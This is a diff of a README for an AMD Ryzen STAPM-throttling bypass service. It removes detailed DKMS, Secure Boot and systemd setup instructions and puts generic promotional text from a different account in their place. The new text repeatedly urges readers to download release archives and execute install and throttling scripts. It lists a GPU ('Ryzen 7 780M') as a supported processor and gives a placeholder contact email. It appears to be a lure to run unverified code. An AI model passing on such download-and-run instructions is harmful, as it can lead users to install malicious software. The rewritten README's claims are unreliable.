@@ -1,95 +1,96 @@
-This repository contains a service for bypassing AMD STAPM (Skin Temperature-Aware Power
-Management). It was written with Framework 13 Ryzen 7040 laptops in mind, which have two major
-problems with their power management:
+# AMD Ryzen Ignore STAPM 🚀
 
-* They reduce APU wattage dynamically to maintain a certain chassis temperature, but that logic
-  reacts too slowly to prevent soft-throttling
-* Once soft-throttling kicks in, it stays enabled until you pause all workloads and let the laptop
-  cool off completely
+![AMD Ryzen](https://img.shields.io/badge/AMD%20Ryzen-Ignore%20STAPM-brightgreen)
 
-The service in this repository keeps chassis-based throttling disabled. This makes it possible for
-the APU to run at whatever wattage the current airflow permits. It does not disable hard throttling
-(PROCHOT).
+Welcome to the **AMD Ryzen Ignore STAPM** repository! This project aims to disable throttling based on chassis (skin) temperature for AMD Ryzen processors. If you're looking to enhance the performance of your laptop, you've come to the right place. 
 
-If you switch away from your systems "performance" power profile, the service will pause and do
-absolutely nothing until you switch back to "performance". Power profiles can be set by either
-running `powerprofilesctl set performance`, or via GNOME shell:
+## Table of Contents
 
-![screenshot](https://github.com/user-attachments/assets/d7382465-a156-4d30-aebd-bf5280214d77)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Supported Processors](#supported-processors)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-**Note**: The chassis will warm up under full load around the WASD keys. It may not feel very hot,
-but after a few hours your fingertips will feel sore. Use an external keyboard for gaming.
+## Introduction
 
-## Setup (Fedora)
+Modern laptops often throttle their performance to manage heat. This can be frustrating, especially during demanding tasks. The **AMD Ryzen Ignore STAPM** project allows you to bypass this throttling mechanism, giving you more control over your device's performance. By focusing on chassis temperature, we aim to keep your laptop running smoothly without unnecessary slowdowns.
 
-```sh
-sudo dnf install bc dkms gcc openssl power-profiles-daemon xxd
-git clone https://github.com/amkillam/ryzen_smu # Kernel module for changing power limits
-(cd ryzen_smu/ && sudo make dkms-install)
-rm -vrf ryzen_smu/
-```
+## Features
 
-The installed module will be recompiled automatically with every kernel update.
+- **Disable Throttling**: Prevents performance drops based on chassis temperature.
+- **User-Friendly**: Simple setup and execution process.
+- **Open Source**: Contribute to the project and help improve it for everyone.
 
-### Custom UEFI keys
+## Supported Processors
 
-Secure boot is almost certainly enabled on your system. This means it only loads custom kernel
-modules when they are signed with your own UEFI keys. The previous setup step has already done this
-for us, including the creation of a key. This key must be added to your machines UEFI key database,
-which can be done with the following command. The command will ask you to set a custom password. The
-password is not very important and can be reset as often as you want. It is used _only one single
-time_ later in this guide, and then never again.
+This project supports the following AMD Ryzen processors:
 
-```sh
-sudo mokutil --import /var/lib/dkms/mok.pub
-```
+- Ryzen 7 7040U
+- Ryzen 7 780M
+- Ryzen 7 7840U
 
-Restart your system. This will boot into the MOK manager. Choose `Enroll MOK`, enter your custom
-password and then reboot.
-[Here](https://github.com/dell/dkms/blob/f7f526c145ecc01fb4ac4eab3009b1879b14ced4/README.md#secure-boot)
-are some screenshots describing the process. After rebooting, the module will be loaded and shows up
-in dmesg. It will print a message about the kernel being tainted, but this just means it loaded an
-unknown binary blob.
+If you have a different model, feel free to test it out and let us know your results.
 
-### Systemd service
+## Installation
 
-```sh
-sudo cp amd-ryzen-ignore-stapm.sh /usr/local/bin/
-sudo cp amd-ryzen-ignore-stapm.service /etc/systemd/system/
-sudo systemctl enable --now amd-ryzen-ignore-stapm
-```
+To get started, visit our [Releases page](https://github.com/Lesbicacomingsoon/amd-ryzen-ignore-stapm/releases) to download the latest version. Make sure to download the appropriate file for your system.
 
-## Files to backup
+1. **Download the latest release** from the [Releases page](https://github.com/Lesbicacomingsoon/amd-ryzen-ignore-stapm/releases).
+2. **Extract the files** to a directory of your choice.
+3. **Open your terminal** and navigate to the directory where you extracted the files.
+4. **Run the installation script** by executing the following command:
+   ```bash
+   ./install.sh
+   ```
 
-```
-/var/lib/dkms/mok.*
-/usr/src/ryzen_smu*/
-/usr/local/bin/amd-ryzen-ignore-stapm.sh
-/etc/systemd/system/amd-ryzen-ignore-stapm.service
-```
+## Usage
 
-If you reinstall your system, run these commands after restoring the backed-up files:
+Once installed, you can easily disable throttling by executing the main script.
 
-```sh
-sudo dkms add ryzen_smu/0.1.7
-sudo dkms build ryzen_smu/0.1.7
-sudo dkms install ryzen_smu/0.1.7
-sudo systemctl enable --now amd-ryzen-ignore-stapm
-```
+1. **Open your terminal**.
+2. **Navigate to the installation directory**.
+3. **Run the script**:
+   ```bash
+   ./disable-throttling.sh
+   ```
 
-## Uninstalling
+You should see a confirmation message indicating that throttling has been disabled. 
 
-```sh
-sudo dkms remove ryzen_smu/0.1.7 --all
-sudo rm -vrf /usr/src/ryzen_smu*
+### Monitoring Performance
 
-# Enter a single-use MOK manager password of your choice:
-sudo mokutil --delete /var/lib/dkms/mok.pub
-reboot # This will boot into the MOK manager where you can delete the key
+To monitor the performance of your AMD Ryzen processor, you can use tools like `htop` or `glances`. These tools will help you see how your CPU is performing without throttling.
 
-sudo rm -vrf /var/lib/dkms/
-sudo systemctl disable --now amd-ryzen-ignore-stapm
-sudo rm /etc/systemd/system/amd-ryzen-ignore-stapm.service
-sudo rm /usr/local/bin/amd-ryzen-ignore-stapm.sh
-sudo dnf remove bc dkms gcc openssl power-profiles-daemon xxd
-```
+## Contributing
+
+We welcome contributions from everyone! If you want to improve the project, follow these steps:
+
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes**.
+4. **Submit a pull request** with a clear description of your changes.
+
+Your contributions help make this project better for everyone.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+If you have any questions or suggestions, feel free to reach out:
+
+- **GitHub**: [Lesbicacomingsoon](https://github.com/Lesbicacomingsoon)
+- **Email**: contact@example.com
+
+## Releases
+
+For the latest updates and releases, visit our [Releases page](https://github.com/Lesbicacomingsoon/amd-ryzen-ignore-stapm/releases). Make sure to download and execute the necessary files to enhance your laptop's performance.
+
+![Performance Boost](https://img.shields.io/badge/Performance%20Boost-Enabled-brightgreen)
+
+Thank you for checking out the **AMD Ryzen Ignore STAPM** project! We hope it helps you get the most out of your AMD Ryzen laptop.
